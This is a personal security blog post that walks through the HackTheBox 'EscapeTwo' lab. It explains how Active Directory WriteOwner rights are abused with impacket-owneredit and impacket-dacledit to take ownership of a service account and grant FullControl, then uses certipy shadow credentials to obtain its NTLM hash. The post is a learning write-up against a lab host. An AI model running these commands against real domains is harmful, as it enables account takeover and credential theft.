<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Abusing WriteOwner Rights in Detail" /><meta property="og:locale" content="en" /><meta name="description" content="Hi again! It’s been… a while? Clearly, I wasn’t capable of maintaining this blog after, wow, 4 years of nothing. That really takes a lot of effort to not write anything here." /><meta property="og:description" content="Hi again! It’s been… a while? Clearly, I wasn’t capable of maintaining this blog after, wow, 4 years of nothing. That really takes a lot of effort to not write anything here." /><link rel="canonical" href="https://xexio15.github.io/posts/WriteOwner/" /><meta property="og:url" content="https://xexio15.github.io/posts/WriteOwner/" /><meta property="og:site_name" content="0x10" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-05-29T18:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Abusing WriteOwner Rights in Detail" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-05-29T18:00:00+02:00","datePublished":"2025-05-29T18:00:00+02:00","description":"Hi again! It’s been… a while? Clearly, I wasn’t capable of maintaining this blog after, wow, 4 years of nothing. That really takes a lot of effort to not write anything here.","headline":"Abusing WriteOwner Rights in Detail","mainEntityOfPage":{"@type":"WebPage","@id":"https://xexio15.github.io/posts/WriteOwner/"},"url":"https://xexio15.github.io/posts/WriteOwner/"}</script><title>Abusing WriteOwner Rights in Detail | 0x10</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0x10"><meta name="application-name" content="0x10"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/22416074?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0x10</a></div><div class="site-subtitle font-italic">Welcome to my personal page, the idea for this site it's to create a timeline about the evolution of my knowledge</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Xexio15" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://www.linkedin.com/in/sergioplans/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Abusing WriteOwner Rights in Detail</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Abusing WriteOwner Rights in Detail</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> 0x10 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, May 29, 2025, 6:00 PM +0200" >May 29<i class="unloaded">2025-05-29T18:00:00+02:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1489 words">8 min read</span></div></div><div class="post-content"><p>Hi again! It’s been… a while? Clearly, I wasn’t capable of maintaining this blog after, wow, 4 years of nothing. That really takes a lot of effort to not write anything here.</p><p>So, let’s start again, but this time I’ll get straight to the point.</p><p>Recently, I was working through some HTB easy-medium machines and tackled <strong>EscapeTwo</strong>, which is rated as an Easy one. In my opinion, it’s “Easy” thanks to some tools we now rely on a lot, specifically <strong>Bloodhound</strong>, which gives you the steps to follow to abuse any weird permission in an AD. But this sometimes leads to people using those documented commands directly and not really understanding what they’re doing. I’ve been in this position too, but over the years, I’ve tried to always understand the basics in these situations. So, the objective for this post is to contribute a little bit to that understanding.</p><blockquote><p><strong>Spoiler Alert:</strong> This will uncover some parts of the EscapeTwo box PrivEsc!</p></blockquote><p>This box basically used the <strong>WriteOwner</strong> privilege of the <code class="language-plaintext highlighter-rouge">ryan</code> user over <code class="language-plaintext highlighter-rouge">ca_svc</code> to gain control over it, which is a <strong>CertPublisher</strong> and allows for some extra abilities.</p><p>But what does <strong>WriteOwner</strong> actually allow, and how do the tools we use work?</p><hr /><h2 id="modify-owner">Modify Owner</h2><p><img data-proofer-ignore data-src="/assets/img/owneredit.png" alt="Owneredit flow" /></p><p>Our first step is to <strong>change the Owner</strong> of the <code class="language-plaintext highlighter-rouge">ca_svc</code> object using <strong>impacket-owneredit</strong>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>impacket-owneredit <span class="nt">-dc-ip</span> 10.10.11.51 <span class="nt">-action</span> write <span class="nt">-new-owner</span> <span class="s1">'ryan'</span> <span class="nt">-target</span> <span class="s1">'ca_svc'</span> sequel.htb/ryan:PASS
</pre></table></code></div></div><p><em>To be clear for the most beginners: these permissions are managed by the <strong>LDAP</strong> service, so every communication will be with LDAP, which is the service that manages users and permissions.</em></p><p>To do this, <code class="language-plaintext highlighter-rouge">impacket-owneredit</code> starts a session in LDAP with the credentials we have, <code class="language-plaintext highlighter-rouge">ryan</code> in this case.<br /> Then we retrieve from LDAP the <a href="https://learn.microsoft.com/en-us/windows/win32/adschema/a-ntsecuritydescriptor#windows-server-2012"><code class="language-plaintext highlighter-rouge">nTSecurityDescriptor</code></a> field of the target user using its <strong>SAMAccountName</strong>, <code class="language-plaintext highlighter-rouge">ca_svc</code>. This field contains two important attributes: the <strong>Owner</strong> of the Object (which is what we will modify now), and the <strong>ACL (or DACL)</strong> of the object (which we’ll talk about in the following steps).</p><p>For those who want a bit more detail about this field, its format looks something like this:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>O:DAG:DAD:AI(A;;LCRPLORC;;;PS)(A;;RC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AO)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;CI;WO;;;S-1-5-21-548670397-972687484-3496335370-1114)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;;RPWP;e45795b2-9455-11d1-aebd-0000f80367c1;;PS)(OA;;RPWP;e45795b3-9455-11d1-aebd-0000f80367c1;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RPWP;77b5b886-944a-11d1-aebd-0000f80367c1;;PS)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;AU)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;AU)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;AU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;AU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;RS)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;RS)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;RS)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;RS)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIID;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-548670397-972687484-3496335370-526)(OA;CIID;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-548670397-972687484-3496335370-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIID;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;OICIID;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIID;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-548670397-972687484-3496335370-519)(A;CIID;LC;;;RU)(A;CIID;CCLCSWRPWPLOCRSDRCWDWO;;;BA)
</pre></table></code></div></div><p>But well… that’s a bit hard to read, so here’s a reduced version that we’ll look into:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>O:DAG:DAD:AI(A;;LCRPLORC;;;PS)(A;;RC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AO)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;CI;WO;;;S-1-5-21-548670397-972687484-3496335370-1114)
</pre></table></code></div></div><p>This is still difficult to read, but it’s what this script is editing. Anyway, a more human-readable reduced version will look like this:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre><td class="rouge-code"><pre>Owner: SEQUEL\Domain Admins
Group: SEQUEL\Domain Admins

DACL:
    AceQualifier           : AccessAllowed
    ObjectDN               : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
    ActiveDirectoryRights  : ReadProperty
    ObjectAceType          : User-Account-Restrictions
    ObjectSID              : S-1-5-21-548670397-972687484-3496335370-1607
    InheritanceFlags       : None
    BinaryLength           : 56
    AceType                : AccessAllowedObject
    ObjectAceFlags         : ObjectAceTypePresent
    IsCallback             : False
    PropagationFlags       : None
    SecurityIdentifier     : S-1-5-21-548670397-972687484-3496335370-553
    AccessMask             : 16
    AuditFlags             : None
    IsInherited            : False
    AceFlags               : None
    InheritedObjectAceType : All
    OpaqueLength           : 0

    AceQualifier           : AccessAllowed
    ObjectDN               : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
    ActiveDirectoryRights  : ReadProperty
    ObjectAceType          : User-Logon
    ObjectSID              : S-1-5-21-548670397-972687484-3496335370-1607
    InheritanceFlags       : None
    BinaryLength           : 56
    AceType                : AccessAllowedObject
    ObjectAceFlags         : ObjectAceTypePresent
    IsCallback             : False
    PropagationFlags       : None
    SecurityIdentifier     : S-1-5-21-548670397-972687484-3496335370-553
    AccessMask             : 16
    AuditFlags             : None
    IsInherited            : False
    AceFlags               : None
    InheritedObjectAceType : All
    OpaqueLength           : 0

    AceType               : AccessAllowed
    ObjectDN              : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
    ActiveDirectoryRights : WriteOwner
    OpaqueLength          : 0
    ObjectSID             : S-1-5-21-548670397-972687484-3496335370-1607
    InheritanceFlags      : ContainerInherit
    BinaryLength          : 36
    IsInherited           : False
    IsCallback            : False
    PropagationFlags      : None
    SecurityIdentifier    : S-1-5-21-548670397-972687484-3496335370-1114
    AccessMask            : 524288
    AuditFlags            : None
    AceFlags              : ContainerInherit
    AceQualifier          : AccessAllowed
</pre></table></code></div></div><p>Basically, this is formed as four values (see <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format?redirectedfrom=MSDN">reference</a>):</p><ul><li><strong>O:</strong> Owner<li><strong>G:</strong> Group<li><strong>D:</strong> DACL<li><strong>S:</strong> SACL (Not present in this example)</ul><p>In our example:</p><ul><li><strong>O:</strong> DA (which corresponds to <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings">SDDL_DOMAIN_ADMINISTRATORS</a>)<li><strong>G:</strong> DA (SDDL_DOMAIN_ADMINISTRATORS)<li><strong>D:</strong> A list of ACEs (<strong>Access Control Entry</strong>)</ul><p>Now, we want to <strong>modify the Owner</strong>, so instead of <code class="language-plaintext highlighter-rouge">O:DA</code>, we want to put <code class="language-plaintext highlighter-rouge">ryan</code> as the owner. Since <code class="language-plaintext highlighter-rouge">ryan</code> is not a default user and doesn’t have a known SID String, instead of two letters, we will put his <strong>SID</strong>.</p><p>To obtain it, the script will query LDAP for this information. We can do it in PowerShell with:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>Get-ADUser ryan -Properties objectSid | Select-Object Name, objectSid

Name        objectSid
----        ---------
Ryan Howard S-1-5-21-548670397-972687484-3496335370-1114
</pre></table></code></div></div><p>So the <code class="language-plaintext highlighter-rouge">nTSecurityDescriptor</code> will look like:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>O:S-1-5-21-548670397-972687484-3496335370-1114G:DAD:AI ...
</pre></table></code></div></div><p>Querying those changes to LDAP will give us <strong>ownership over</strong> <code class="language-plaintext highlighter-rouge">ca_svc</code>.</p><hr /><h2 id="dacl-edit">DACL Edit</h2><p><img data-proofer-ignore data-src="/assets/img/dacledit.png" alt="DACLEdit flow" /></p><p>The next step is using <strong>impacket-dacledit</strong>. This script does the same first steps until obtaining the <code class="language-plaintext highlighter-rouge">nTSecurityDescriptor</code>, and as you probably already guessed, it will modify the <strong>DACL</strong> we were talking about before.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>impacket-dacledit <span class="nt">-action</span> <span class="s1">'write'</span> <span class="nt">-rights</span> <span class="s1">'FullControl'</span> <span class="nt">-principal</span> <span class="s1">'ryan'</span> <span class="nt">-target</span> <span class="s1">'ca_svc'</span> sequel.htb/ryan:PASS <span class="nt">-dc-ip</span> 10.10.11.51
</pre></table></code></div></div><h4 id="but-what-is-the-dacl">But what is the DACL?</h4><p><strong>DACL</strong> stands for <strong>Discretionary Access Control List</strong> (sometimes referred to as ACL), which, as its name suggests, is a list. This list contains <strong>ACEs</strong> (<strong>Access Control Entries</strong>), which are every specified permission over our object.</p><p>Using the same EscapeTwo example, the reduced DACL string looks like this:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>D:AI(A;;LCRPLORC;;;PS)(A;;RC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AO)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;CI;WO;;;S-1-5-21-548670397-972687484-3496335370-1114)
</pre></table></code></div></div><p>Here, <code class="language-plaintext highlighter-rouge">AI</code> corresponds to <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format?redirectedfrom=MSDN">SDDL_AUTO_INHERITED</a>, meaning it will inherit the group DACL, and following adds any other specific permission on this object. Each element between parentheses represents an <strong>ACE</strong>. If we look at the last one, we see something familiar:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>(A;CI;WO;;;S-1-5-21-548670397-972687484-3496335370-1114)
</pre></table></code></div></div><p>This <strong>SID</strong> is <code class="language-plaintext highlighter-rouge">ryan</code>’s, and we can see here this <strong>WriteOwner</strong> permission set as <code class="language-plaintext highlighter-rouge">WO</code>. More human-readable, it will look like:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>AceType               : AccessAllowed
ObjectDN              : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
ActiveDirectoryRights : WriteOwner &lt;---- PERMISSION
OpaqueLength          : 0
ObjectSID             : S-1-5-21-548670397-972687484-3496335370-1607
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-548670397-972687484-3496335370-1114 &lt;--- ryan SID
AccessMask            : 524288
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
</pre></table></code></div></div><p>So, okay, we asked LDAP for this DACL, now what? Well, in the previous step, we changed the owner of this object to <code class="language-plaintext highlighter-rouge">ryan</code>. Now, we are allowed to <strong>modify those ACEs</strong>, and as we specified in the arguments, we will <strong>add a new ACE</strong> that specifies <strong>FullControl</strong> to <code class="language-plaintext highlighter-rouge">ca_svc</code>. The following ACE will be added:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-548670397-972687484-3496335370-1114)
</pre></table></code></div></div><p>As we can see, now, instead of <code class="language-plaintext highlighter-rouge">WO</code>, the third value contains a bunch of rights, those are every single AD-defined right, so we have <strong>total control over the object</strong> when we act as <code class="language-plaintext highlighter-rouge">ryan</code>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>AceType               : AccessAllowed
ObjectDN              : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
ActiveDirectoryRights : CreateChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner &lt;---- HERE
OpaqueLength          : 0
ObjectSID             : S-1-5-21-548670397-972687484-3496335370-1607
InheritanceFlags      : ContainerInherit
BinaryLength          : 24
IsInherited           : True
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-32-544
AccessMask            : 983485
AuditFlags            : None
AceFlags              : ContainerInherit, Inherited
AceQualifier          : AccessAllowed

</pre></table></code></div></div><hr /><h2 id="obtaining-shadow-credentials">Obtaining Shadow Credentials</h2><p>This part goes a bit beyond the original topic, since we already abused WriteOwner, but leaving the path unfinished felt odd also I think it gives a nice example of what <strong>FullControl</strong> allows. So, let’s see how to complete the exploitation. Since this isn’t the main focus, I won’t go into extensive detail.</p><p>This step is specific to this case, as we now have FullControl over a <strong>CertPublishers</strong> user who can issue certificates. For this, we’ll use <strong>certipy</strong>.</p><p>We use the command:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy shadow auto <span class="nt">-username</span> ryan@sequel.htb <span class="nt">-password</span> PASS <span class="nt">-account</span> ca_svc <span class="nt">-dc-ip</span> 10.10.11.51
</pre></table></code></div></div><p><strong>Shadow</strong> refers to obtaining a shadow credential, and <strong>auto</strong> is a multi-step process where a new Key Credential is added, the NTLM hash is obtained, and then the Key Credential is deleted to avoid leaving any trace.</p><p><img data-proofer-ignore data-src="/assets/img/certipy.png" alt="Certipy flow" /></p><p>Here’s what certipy does:</p><ol><li><strong>Creates an LDAP session</strong> as <code class="language-plaintext highlighter-rouge">ryan</code>.<li><strong>Generates an X509 Certificate</strong> and a KeyCredential for this certificate.<li><strong>Modifies the <code class="language-plaintext highlighter-rouge">ca_svc</code> <code class="language-plaintext highlighter-rouge">msDS-KeyCredentialLink</code> attribute</strong> to include the newly created public key.<li>Using this KeyCredential, it auths through <strong>Kerberos PKINIT</strong> (which allows certificate-based authentication, this is what a shadow credential is), obtains a <strong>TGT</strong> (Ticket Granting Ticket)<li>Then requests a <strong>TGS</strong> (Ticket Granting Service) for <code class="language-plaintext highlighter-rouge">ca_svc</code>.<li>Since we can get the <strong>encryption key</strong> of this user, we can <strong>decrypt the TGS</strong> and finally <strong>obtain the NTLM hash</strong>, which can be used with Pass-the-Hash.<li>Before finishing, the key is deleted from <code class="language-plaintext highlighter-rouge">msDS-KeyCredentialLink</code> to remove any trace.</ol><p>With this, we have full and easy access to <code class="language-plaintext highlighter-rouge">ca_svc</code>. The PrivEsc for this machine doesn’t end here, but that’s a topic for another post.</p><hr /><h2 id="conclusion">Conclusion</h2><p>So that’s it, a bit of Active Directory in detail. It’s a simple topic, but I think posts like this can help a lot of newcomers, and honestly, it also helps me reinforce my own understanding of how this environment works.</p><p>I really like the Shadow Credentials step, so I’ll probably write something more in-depth about it in the future, since it’s a really interesting way of authenticating in AD and has a lot of details.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/cybersecurity/'>Cybersecurity</a>, <a href='/categories/active-directory/'>Active Directory</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/cybersecurity/" class="post-tag no-text-decoration" >cybersecurity</a> <a href="/tags/learning/" class="post-tag no-text-decoration" >learning</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >pentesting</a> <a href="/tags/ad/" class="post-tag no-text-decoration" >ad</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >active-directory</a> <a href="/tags/write-owner/" class="post-tag no-text-decoration" >write-owner</a> <a href="/tags/escapetwo/" class="post-tag no-text-decoration" >escapetwo</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Abusing WriteOwner Rights in Detail - 0x10&url=https://xexio15.github.io/posts/WriteOwner/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Abusing WriteOwner Rights in Detail - 0x10&u=https://xexio15.github.io/posts/WriteOwner/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Abusing WriteOwner Rights in Detail - 0x10&url=https://xexio15.github.io/posts/WriteOwner/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"> <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div><div id="access-lastmod" class="post"> <span >Recent Update</span ><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/OSCP-first-journey/">My first failed journey in the OSCP</a></ul></div><div id="access-tags"> <span >Trending Tags</span ><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/cybersecurity/">cybersecurity</a> <a class="post-tag" href="/tags/learning/">learning</a> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a 